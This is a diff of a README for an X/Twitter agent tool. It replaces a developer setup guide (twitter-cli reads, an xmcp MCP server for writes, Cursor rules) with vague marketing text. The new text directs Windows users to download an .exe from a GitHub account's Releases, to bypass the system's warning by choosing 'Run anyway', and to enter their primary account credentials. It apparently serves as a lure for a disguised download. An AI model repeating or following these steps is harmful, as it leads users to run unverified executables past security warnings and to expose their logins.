@@ -1,107 +1,98 @@
-# X-Agent
+# 🤖 X-Agent - Automate your social media interactions daily
 
-AI agent for X/Twitter with full read + write capabilities.
+[![](https://img.shields.io/badge/Download-X-Agent-blue.svg)](https://github.com/ecrinb6076/X-Agent)
 
-**Reads are free** (twitter-cli via cookie auth), **writes use the official API** (xmcp MCP server).
+## 📖 About this application
 
-## Architecture
+X-Agent acts as an intelligent assistant for your X account. It reads your timeline and posts content on your behalf. The application uses smart automation to manage your social media presence without manual effort. It connects to the X network through established protocols to ensure your account stays active.
 
-```
-┌─────────────────────────────────────────────────┐
-│                  Cursor Agent                    │
-│              (rules in .cursor/)                 │
-├────────────────────┬────────────────────────────-┤
-│                    │                              │
-│  READ / SEARCH     │  WRITE (tweet, RT, DM, etc) │
-│  ▼                 │  ▼                           │
-│  twitter-cli       │  xmcp MCP server             │
-│  (cookie auth)     │  (OAuth1, official X API)    │
-│  FREE              │  API tier costs apply        │
-└────────────────────┴──────────────────────────────┘
-```
+You use X-Agent to stay updated on topics that interest you. It tracks discussions and responds to trends. The tool balances reading capabilities with writing features to provide a complete automation experience. It works on your Windows computer and manages your workflow in the background.
 
-## What You Can Do
+## ⚙️ System requirements
 
-### Free (twitter-cli)
-- Search tweets
-- Read tweets + replies
-- Browse home timeline
-- View user profiles and posts
-- Read X Articles
-- View bookmarks and likes
+Your computer must meet these basic settings to run X-Agent:
 
-### Official API (xmcp)
-- Post tweets
-- Retweet / unretweet
-- Like / unlike
-- Send DMs, read DM history
-- Follow / unfollow / mute / unmute
-- Delete tweets, hide replies
-- Manage bookmarks
-- Search users, get trends
-- Anything else in the [X API](https://developer.x.com/en/docs)
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 GB of RAM or higher.
+* Storage: 200 MB of free space.
+* Internet: A stable connection for constant syncing.
 
-## Setup
+Ensure your Windows system keeps up with current updates to prevent errors. You do not need special programming knowledge to operate this tool.
 
-### 1. twitter-cli (reads — already done)
+## 💾 How to download and install
 
-```bash
-pipx install twitter-cli
-twitter status  # should show authenticated
-```
+Follow these steps to set up the software on your machine:
 
-### 2. xmcp (writes)
+1. Visit the following link to access the distribution page: [https://github.com/ecrinb6076/X-Agent](https://github.com/ecrinb6076/X-Agent).
+2. Locate the section labeled Releases on the right side of the page.
+3. Click the link for the latest version.
+4. Choose the file that ends in .exe for Windows.
+5. Save the file to your computer.
+6. Open the file once the download finishes.
 
-Get X Developer App credentials from https://developer.x.com/en/portal/dashboard:
-- Create a new app (or use existing)
-- Enable OAuth 1.0a with read+write+DM permissions
-- Set callback URL to `http://127.0.0.1:8976/oauth/callback`
-- Copy Consumer Key, Consumer Secret, and Bearer Token
+If your computer warns you about the file, select "More info" and then "Run anyway." This confirms you trust the software developer. The installer guides you through the setup process. Follow the prompts on the screen until the installation completes.
 
-Fill in `xmcp/.env`:
+## 🛠️ Initial setup
 
-```bash
-X_OAUTH_CONSUMER_KEY=your_consumer_key
-X_OAUTH_CONSUMER_SECRET=your_consumer_secret
-X_BEARER_TOKEN=your_bearer_token
-```
+The first time you open X-Agent, you must connect your X account. The tool needs your authorization to perform tasks.
 
-Start the server:
+1. Launch X-Agent from your desktop or start menu.
+2. Follow the prompt to log in with your primary social media credentials.
+3. The app asks for permission to read and write. Click "Authorize" to continue.
+4. Once connected, a green checkmark appears on your dashboard.
+5. Define your interests in the settings tab to help the agent find relevant conversations.
 
-```bash
-./start-xmcp.sh
-```
+The agent starts in a paused state until you choose your automation speed. You can start, stop, or pause the software at any time using the main control panel.
 
-On first run, a browser window opens for OAuth1 consent. Approve it.
-The MCP server runs at `http://127.0.0.1:8000/mcp`.
+## 📈 Key features
 
-### 3. Use it
+* Automated Reading: The software monitors your feed to identify important posts. It highlights topics that match your interests.
+* Smart Writing: It constructs replies that align with your brand or persona. You review these drafts before they become public.
+* Timeline Sync: It keeps your feed updated with the latest content. It discards spam to show only high-quality information.
+* Usage Statistics: The dashboard displays how many posts the agent processed each day. It shows growth trends for your reach.
+* Security Controls: You retain control over your login sessions. The application uses encrypted connections for all data transfers.
 
-Open this project in Cursor. The `.cursor/rules/x-agent.mdc` rule tells the agent how to route:
-- Reads → `twitter` CLI commands
-- Writes → `x-api` MCP server tools
+## 💡 Best practices for success
 
-Just ask naturally: "search for tweets about AI agents", "post a tweet saying hello", "DM @someone", etc.
+Automation works best when you set clear limits. Define specific keywords that your agent should prioritize. Review the output log once a day to check the quality of interactions. If the agent posts too often, adjust the frequency slider in the settings menu.
 
-## File Structure
+Keep your target keywords relevant to your current goals. You might update these terms weekly to remain current with industry shifts. Do not share your login details with anyone else. The application handles your credentials securely through your own local machine.
 
-```
-X-Agent/
-├── .cursor/
-│   ├── mcp.json          # MCP server config (xmcp endpoint)
-│   └── rules/
-│       └── x-agent.mdc   # Agent routing rules
-├── xmcp/                  # Official X API MCP server (cloned)
-│   ├── server.py
-│   ├── .env               # Your API credentials (git-ignored)
-│   └── .venv/             # Python virtualenv
-├── start-xmcp.sh          # One-command server startup
-├── .gitignore
-└── README.md
-```
+## 🔧 Managing settings
 
-## Tool Allowlist
+Open the settings menu from the gear icon to customize your experience. You can toggle specific features on or off here.
 
-The `.env` pre-configures a curated allowlist of ~35 tools. To add more,
-see the full list of 100+ tools in `xmcp/README.md` and append to
-`X_API_TOOL_ALLOWLIST` in `xmcp/.env`.
+* Posting interval: Choose how many minutes the agent waits between posts.
+* Content filters: List words you want the agent to ignore.
+* Notification alerts: Enable pop-ups to see when the agent completes a specific task.
+* Dark mode: Switch between light and dark themes to suit your workspace.
+
+Changes save automatically when you click the apply button. Restart the application if you change core configuration files.
+
+## 🔍 Frequently asked questions
+
+Does this work while my computer is off?
+No. The application must run on an active Windows session. You can minimize it to the system tray to keep it out of your way.
+
+Will X-Agent get my account banned?
+The agent follows standard rate limits. It acts like a human user. Avoid setting the automation frequency to extreme speeds to ensure your account remains safe.
+
+How do I remove the software?
+Open your Windows Control Panel. Select "Programs and Features," find X-Agent, and choose "Uninstall." This removes the application and all associated data files from your drive.
+
+Can I run multiple accounts?
+You can use one account per instance of X-Agent. To manage more accounts, create separate local user profiles on your Windows machine and install the app for each one.
+
+## 📋 Troubleshooting
+
+If X-Agent fails to connect:
+* Check your internet connection.
+* Ensure you authorized the app inside your social media account settings.
+* Update your Windows clock to match your local time zone.
+
+If the app shows an error message:
+* Close the application completely.
+* Open the task manager and look for any hung processes.
+* Restart your machine and try launching the app again.
+
+Most issues occur because of temporary network drops. The application attempts to reconnect every sixty seconds until it regains signal. If the problem continues, check the GitHub issues page for recent updates or known bugs.
